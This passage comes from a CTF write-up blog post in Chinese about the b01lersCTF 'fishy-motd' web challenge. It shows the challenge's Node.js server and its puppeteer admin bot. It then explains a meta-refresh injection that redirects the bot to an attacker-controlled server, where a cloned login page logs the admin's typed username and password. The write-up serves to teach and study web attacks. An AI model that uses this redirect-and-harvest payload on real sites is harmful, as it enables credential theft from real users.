class="title function_">sendFile</span>(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">get</span>(<span class="string">&#x27;/style.css&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(<span class="string">&#x27;style.css&#x27;</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> id = req.<span class="property">query</span>.<span class="property">motd</span>;</span><br><span class="line">    <span class="keyword">if</span> (!id) &#123;</span><br><span class="line">        fs.<span class="title function_">readFile</span>(<span class="string">&#x27;./login.html&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">                res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Internal server error, please open a ticket&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                res.<span class="title function_">type</span>(<span class="string">&#x27;text/html&#x27;</span>).<span class="title function_">send</span>(data.<span class="title function_">toString</span>().<span class="title function_">replace</span>(<span class="string">&#x27;&#123;&#123;motd&#125;&#125;&#x27;</span>, <span class="string">&#x27;Welcome to the server!&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (id <span class="keyword">in</span> messages) &#123;</span><br><span class="line">            fs.<span class="title function_">readFile</span>(<span class="string">&#x27;./login.html&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">                    res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Internal server error, please open a ticket&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    res.<span class="title function_">type</span>(<span class="string">&#x27;text/html&#x27;</span>).<span class="title function_">send</span>(data.<span class="title function_">toString</span>().<span class="title function_">replace</span>(<span class="string">&#x27;&#123;&#123;motd&#125;&#125;&#x27;</span>, messages[id]));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&#x27;MOTD not found&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> username = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line">    <span class="keyword">const</span> password = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(username)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(password)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (username === user &amp;&amp; password === pass) &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(flag);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;Incorrect username or password&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">get</span>(<span class="string">&#x27;/start&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> id = req.<span class="property">query</span>.<span class="property">motd</span>;</span><br><span class="line">    <span class="keyword">if</span> (id &amp;&amp; id <span class="keyword">in</span> messages) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> result = <span class="keyword">await</span> <span class="title function_">adminBot</span>(id);</span><br><span class="line">            <span class="keyword">if</span> (result.<span class="property">error</span>) &#123;</span><br><span class="line">                res.<span class="title function_">send</span>(result.<span class="property">error</span>)</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                res.<span class="title function_">send</span>(<span class="string">&#x27;Hope everyone liked your message!&#x27;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&#x27;Something went wrong, please open a ticket&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;MOTD not found&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">post</span>(<span class="string">&#x27;/motd&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> motd = req.<span class="property">body</span>.<span class="property">motd</span>;</span><br><span class="line">    <span class="keyword">const</span> id = <span class="title function_">nanoid</span>();</span><br><span class="line">    messages[id] = motd;</span><br><span class="line">    fs.<span class="title function_">readFile</span>(<span class="string">&#x27;./motd.html&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Internal server error, please open a ticket&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">type</span>(<span class="string">&#x27;text/html&#x27;</span>).<span class="title function_">send</span>(data.<span class="title function_">toString</span>().<span class="title function_">replaceAll</span>(<span class="string">&#x27;&#123;&#123;id&#125;&#125;&#x27;</span>, id));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">get</span>(<span class="string">&#x27;/motd&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;Please use the form to submit a message of the day.&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">adminBot</span> = <span class="keyword">async</span> (<span class="params">id</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123;</span><br><span class="line">        <span class="attr">headless</span>: <span class="literal">true</span>, <span class="comment">// Uncomment below if the sandbox is causing issues</span></span><br><span class="line">        <span class="comment">// args: [&#x27;--no-sandbox&#x27;, &#x27;--disable-setuid-sandbox&#x27;, &#x27;--single-process&#x27;]</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>();</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">setViewport</span>(&#123; <span class="attr">width</span>: <span class="number">800</span>, <span class="attr">height</span>: <span class="number">600</span> &#125;);</span><br><span class="line">    <span class="keyword">const</span> url = <span class="string">`http://localhost:<span class="subst">$&#123;port&#125;</span>/login?motd=<span class="subst">$&#123;id&#125;</span>`</span>;</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">goto</span>(url);</span><br><span class="line">    <span class="keyword">await</span> page.<span class="property">mouse</span>.<span class="title function_">click</span>(<span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">r</span> =&gt;</span> <span class="built_in">setTimeout</span>(r, <span class="number">1000</span>));</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (url !== <span class="keyword">await</span> page.evaluate(<span class="function">() =&gt;</span> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123; <span class="attr">error</span>: <span class="string">&quot;Hey! Something&#x27;s fishy here!&quot;</span> &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123; <span class="attr">error</span>: <span class="string">&quot;Hey! Something&#x27;s fishy here!&quot;</span> &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">r</span> =&gt;</span> <span class="built_in">setTimeout</span>(r, <span class="number">5000</span>));</span><br><span class="line">    <span class="keyword">await</span> page.<span class="property">mouse</span>.<span class="title function_">click</span>(<span class="number">420</span>, <span class="number">280</span>);</span><br><span class="line">    <span class="keyword">await</span> page.<span class="property">keyboard</span>.<span class="title function_">type</span>(user);</span><br><span class="line">    <span class="keyword">await</span> page.<span class="property">mouse</span>.<span class="title function_">click</span>(<span class="number">420</span>, <span class="number">320</span>);</span><br><span class="line">    <span class="keyword">await</span> page.<span class="property">keyboard</span>.<span class="title function_">type</span>(pass);</span><br><span class="line">    <span class="keyword">await</span> page.<span class="property">mouse</span>.<span class="title function_">click</span>(<span class="number">420</span>, <span class="number">360</span>);</span><br><span class="line">    <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">r</span> =&gt;</span> <span class="built_in">setTimeout</span>(r, <span class="number">1000</span>));</span><br><span class="line">    <span class="keyword">await</span> browser.<span class="title function_">close</span>();</span><br><span class="line">    messages[id] = <span class="literal">undefined</span>;</span><br><span class="line">    <span class="keyword">return</span> &#123; <span class="attr">error</span>: <span class="literal">null</span> &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">listen</span>(&#123; port, <span class="attr">host</span>: <span class="string">&#x27;0.0.0.0&#x27;</span> &#125;, <span class="function">(<span class="params">err, address</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">        process.<span class="title function_">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server listening at <span class="subst">$&#123;address&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>
+
+<p><code>adminBot</code> 函数模拟了管理员的行为，当我们在前端选择了部署特定的留言时，该留言内容会被传给这个模拟管理员，延迟1秒后检测页面是否需要报错，若不需要则再等待5秒，随后它通过点击特定位置并依次输入管理员的用户名、密码并确定登陆。</p>
+<p>因此我们有如下思路：通过传入标签</p>
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;1; url=http://myServerIp:myPort/&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>让模拟管理员在输入账密之前跳转至自己服务器的伪造页面，并获取其输入的账密。随后我们输入该账密即可登录，获取flag。</p>
+<p>自己伪造页面需要考虑到模拟管理员的点击坐标问题，非常麻烦，因此直接借用题目源码的”login.html”页面（就是原登录页面），稍微加点手脚，在 <code>login</code> 函数中加上</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(username)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(password)</span><br></pre></td></tr></table></figure></div>
+
+<p>将输入并提交的账密登记到服务器后台上。被登记到控制台的内容会被回显到服务器监控日志上（例如 <code>Docker run</code> 不调用 <code>-d</code> 参数使容器不被放到后台挂载，就能直接监控到容器的日志），此处省略服务器配置问题。</p>
+<!-- flag of hidden posts -->
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> b01lersCTF</li>
+        <li><strong>Author:</strong> Forestsetyou</li>
+        <li><strong>Created at
+                :</strong> 2023-03-18 21:59:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2023-03-19 01:57:00
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://forestsetyou.github.io/2023/03/18/Security/CTF/b01lersCTF/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">b01lersCTF</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#b01lersCTF"><span class="nav-text">b01lersCTF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#warmUp"><span class="nav-text">warmUp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fishy-motd"><span class="nav-text">fishy-motd</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Forestsetyou</a>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.1</a></span>
+        </div>
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
